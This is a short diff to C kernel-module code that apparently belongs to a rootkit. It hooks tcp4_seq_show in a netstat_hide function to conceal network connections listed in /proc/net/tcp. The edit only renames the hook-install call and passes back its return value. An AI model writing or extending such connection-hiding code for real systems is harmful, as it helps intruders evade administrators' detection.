@@ -17,11 +17,11 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
 static int netstat_hide(void)
 {
     int ret;
-    ret = install_hook(&tcp4_hook);
+    ret = netstat_install_hook(&tcp4_hook);
     //ret = set_ops("/proc/net/tcp");
     printk(KERN_ALERT "set ops done, ret equals to : %d", ret);
 
-    return 0;
+    return ret;
 }
 static void unhide(void)
 {
